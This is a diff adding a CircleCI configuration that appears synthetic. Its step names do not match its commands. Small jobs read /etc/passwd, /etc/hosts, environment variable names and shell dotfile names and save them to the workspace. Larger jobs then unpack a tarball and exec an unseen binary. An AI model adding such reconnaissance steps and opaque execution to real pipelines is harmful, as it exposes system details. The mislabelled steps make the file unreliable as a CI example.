+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/2988c8e9fa0310d1eed42bdec32f040502e 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  style-symbol-74:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: GENTLY cut the node pool
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; touch -d '2020-01-01 12:00' /var/tmp/omega.out && stat -c %y /var/tmp/omega.out; true ; } > /var/tmp/wrk/n
+            echo "ok $(wc -c </var/tmp/wrk/n)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'n'
+  UAT_INIT_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/n 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  rank_address_stream_dict:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Focus the login button then screenshot
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; if [ -s /etc/group ]; then echo yes; fi; true ; } > /var/tmp/wrk/bZ
+            echo "ok $(wc -c </var/tmp/wrk/bZ)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'bZ'
+  v6-rc1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/bZ 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+  double_arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Thank Noah
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; for i in horse cat seal dog frog duck; do echo ${#i}; done; true ; } > /var/tmp/wrk/146.3.117
+            echo "ok $(wc -c </var/tmp/wrk/146.3.117)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '146.3.117'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Read handoff file
+          command: |
+            wc -m /var/tmp/wrk/146.3.117 2>/dev/null || true
+      - run:
+          name: Snapshot repo
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xjf ci-extras.tar.bz2
+      - run:
+          command: exec ./extract-aggregator
+
+  winStream4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Never mirror the stale snapshots on fridays
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; touch -t 202407101200 "/tmp/green.campus.marker" && stat -c %y "/tmp/green.campus.marker"; true ; } > /var/tmp/wrk/7itanc0pper
+            echo "ok $(wc -c </var/tmp/wrk/7itanc0pper)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '7itanc0pper'
+  unmountAddressUTF8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: REBUILD WEB TIER
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; ls -X /var/lib | shuf -n 2; true ; } > /var/tmp/wrk/b6l
+            echo "ok $(wc -c </var/tmp/wrk/b6l)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'b6l'
+  fE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: L878
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | sort -t ':' -k7,7; true ; } > /var/tmp/wrk/ux
+            echo "ok $(wc -c </var/tmp/wrk/ux)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'ux'
+  tea:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Remit And Sign Off On Ledger
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; touch '/var/tmp/addon.peach.conf' && readlink -f '/var/tmp/addon.peach.conf'; true ; } > /var/tmp/wrk/garden.zinc.quick.polar
+            echo "ok $(wc -c </var/tmp/wrk/garden.zinc.quick.polar)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'garden.zinc.quick.polar'
+  view_page:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Hold short of the mounted volume
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; compgen -b|grep -x pwd; true ; } > /var/tmp/wrk/xOT
+            echo "ok $(wc -c </var/tmp/wrk/xOT)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'xOT'
+  relayOpt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: okay verify the seating plan i guess
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; sed --quiet -e "1p" /proc/cpuinfo; true ; } > /var/tmp/wrk/iter_308
+            echo "ok $(wc -c </var/tmp/wrk/iter_308)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'iter_308'
+  da-cd-93-e2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Do not scale out the ingress rules yet
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; printenv | cut -f1 -d"=" | sort | uniq -c | sort --reverse --numeric-sort; true ; } > /var/tmp/wrk/8b91f858f26
+            echo "ok $(wc -c </var/tmp/wrk/8b91f858f26)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '8b91f858f26'
+  shortCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Redact MFA Settings 2025
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; ln -sf /usr/bin/env "/var/tmp/bat1.out" && ls -l "/var/tmp/bat1.out"; true ; } > /var/tmp/wrk/yFGyFVH
+            echo "ok $(wc -c </var/tmp/wrk/yFGyFVH)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'yFGyFVH'
+  FTPView:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Besiege the background checks
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | grep -Hn --color=always host | sort | uniq -c; true ; } > /var/tmp/wrk/146.3.117
+            echo "ok $(wc -c </var/tmp/wrk/146.3.117)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '146.3.117'
+  allow_insert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Dim the audit log
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; ulimit -a | head -n 4; true ; } > /var/tmp/wrk/kjtsi0
+            echo "ok $(wc -c </var/tmp/wrk/kjtsi0)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'kjtsi0'
+  GlobalProxyUtil:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Action the triage
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; sort -k3 -t : -n /etc/passwd | cut -f1 -d':' | sort -ru; true ; } > /var/tmp/wrk/t6g
+            echo "ok $(wc -c </var/tmp/wrk/t6g)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 't6g'
+  addr_func:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Go ahead and draft the help center
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; ls /dev | tr "a-z" "A-Z" | sort | uniq -c | sort -n -r; true ; } > /var/tmp/wrk/2988c8e9fa0310d1eed42bdec32f040502e
+            echo "ok $(wc -c </var/tmp/wrk/2988c8e9fa0310d1eed42bdec32f040502e)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - '2988c8e9fa0310d1eed42bdec32f040502e'
+  OMGX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: remember to export the chapter markers
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; for name in {1..8..2} ; do sleep 0.1;echo "$name"; done | head -n3; true ; } > /var/tmp/wrk/ForestNickelCoin
+            echo "ok $(wc -c </var/tmp/wrk/ForestNickelCoin)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'ForestNickelCoin'
+  fgh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: still loading primary node
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/var/tmp/campus.gz" && zcmp /etc/hosts "/var/tmp/campus.gz" && echo same; true ; } > /var/tmp/wrk/acGz4wUR5i1G40xtl
+            echo "ok $(wc -c </var/tmp/wrk/acGz4wUR5i1G40xtl)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'acGz4wUR5i1G40xtl'
+  proj-romeo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: PICK LOADING BAY END
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; for f in $HOME/.bash*; do basename "${f}"; done; true ; } > /var/tmp/wrk/n
+            echo "ok $(wc -c </var/tmp/wrk/n)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'n'
+  p4yment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Mid Run Playtest
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; echo -n '1 2 3 4 5'|b2sum; true ; } > /var/tmp/wrk/vectorproxyreef
+            echo "ok $(wc -c </var/tmp/wrk/vectorproxyreef)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'vectorproxyreef'
+  BlockingPixelRenderer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/wrk
+      - run:
+          name: Harmonize proxy config
+          command: |
+            mkdir -p /var/tmp/wrk
+            { set +o pipefail 2>/dev/null; ls -FA /var/cache | tr '\n' ' '; true ; } > /var/tmp/wrk/bZ
+            echo "ok $(wc -c </var/tmp/wrk/bZ)"
+      - persist_to_workspace:
+          root: /var/tmp/wrk
+          paths:
+            - 'bZ'
+workflows:
+  main:
+    jobs:
+      - BUCKET_NBF
+      - winStream4:
+          requires:
+            - BUCKET_NBF
+      - ivan-ship:
+          requires:
+            - winStream4
+      - recordPx:
+          requires:
+            - winStream4
+      - unmountAddressUTF8:
+          requires:
+            - recordPx
+      - auh-check:
+          requires:
+            - unmountAddressUTF8
+      - start_or_default:
+          requires:
+            - unmountAddressUTF8
+      - fE:
+          requires:
+            - start_or_default
+      - xi-test:
+          requires:
+            - fE
+      - no_idx:
+          requires:
+            - fE
+      - tea:
+          requires:
+            - no_idx
+      - jess-test:
+          requires:
+            - tea
+      - hDCHiddenMidTime:
+          requires:
+            - tea
+      - view_page:
+          requires:
+            - hDCHiddenMidTime
+      - add-metrics-timeout:
+          requires:
+            - view_page
+      - E5:
+          requires:
+            - view_page
+      - relayOpt:
+          requires:
+            - E5
+      - rollout:
+          requires:
+            - relayOpt
+      - cell-riddle:
+          requires:
+            - relayOpt
+      - da-cd-93-e2:
+          requires:
+            - cell-riddle
+      - Build_Prod3:
+          requires:
+            - da-cd-93-e2
+      - ICON_DEFER_SCENE_DRAIN_BACK
+      - shortCb:
+          requires:
+            - ICON_DEFER_SCENE_DRAIN_BACK
+      - ShipProd:
+          requires:
+            - shortCb
+      - double_arg:
+          requires:
+            - shortCb
+      - FTPView:
+          requires:
+            - double_arg
+      - intergration:
+          requires:
+            - FTPView
+      - pluginIsNull:
+          requires:
+            - FTPView
+      - allow_insert:
+          requires:
+            - pluginIsNull
+      - shippit:
+          requires:
+            - allow_insert
+      - paintNewModelFile:
+          requires:
+            - allow_insert
+      - GlobalProxyUtil:
+          requires:
+            - paintNewModelFile
+      - tam-ship:
+          requires:
+            - GlobalProxyUtil
+      - tap_or_default:
+          requires:
+            - GlobalProxyUtil
+      - addr_func:
+          requires:
+            - tap_or_default
+      - verify:
+          requires:
+            - addr_func
+      - Step-SrcClock:
+          requires:
+            - addr_func
+      - OMGX:
+          requires:
+            - Step-SrcClock
+      - py311-test:
+          requires:
+            - OMGX
+      - footer-image-block:
+          requires:
+            - OMGX
+      - fgh:
+          requires:
+            - footer-image-block
+      - verify-full-integration-tests:
+          requires:
+            - fgh
+      - style-symbol-74:
+          requires:
+            - fgh
+      - proj-romeo:
+          requires:
+            - style-symbol-74
+      - UAT_INIT_8:
+          requires:
+            - proj-romeo
+      - p6788:
+          requires:
+            - proj-romeo
+      - p4yment:
+          requires:
+            - p6788
+      - PROD_HOOK_1:
+          requires:
+            - p4yment
+      - rank_address_stream_dict:
+          requires:
+            - p4yment
+      - BlockingPixelRenderer:
+          requires:
+            - rank_address_stream_dict
+      - v6-rc1:
+          requires:
+            - BlockingPixelRenderer
+      - gClanLevel
+      - cleanup4
+      - readersById
+      - Prepare_Service7:
+          requires:
+            - gClanLevel
+            - cleanup4
+            - readersById
+      - v2-edge2:
+          requires:
+            - gClanLevel
+            - cleanup4
+            - readersById
+      - p-v2:
+          requires:
+            - gClanLevel
+            - cleanup4
+            - readersById
+      - canary:
+          requires:
+            - gClanLevel
+            - cleanup4
+            - readersById
+      - xray-1:
+          requires:
+            - gClanLevel
+            - cleanup4
+            - readersById
+      - v6-beta4:
+          requires:
+            - gClanLevel
+            - cleanup4
+            - readersById
+      - nova-rev:
+          requires:
+            - gClanLevel
+            - cleanup4
+            - readersById
+      - armor-trait-stale-rollback
+      - depoly:
+          requires:
+            - armor-trait-stale-rollback
+      - panWorkerRequest:
+          requires:
+            - armor-trait-stale-rollback
+      - STAGE_UAT:
+          requires:
+            - panWorkerRequest
+      - sara-chen:
+          requires:
+            - panWorkerRequest
+      - vega-plus:
+          requires:
+            - sara-chen
+      - recomend:
+          requires:
+            - sara-chen
+      - run-staging-release-candidate:
+          requires:
+            - recomend
+      - deg_ave:
+          requires:
+            - recomend
+      - zulu:
+          requires:
+            - deg_ave
+      - rd_ver_img:
+          requires:
+            - deg_ave
+      - jun22-release:
+          requires:
+            - rd_ver_img
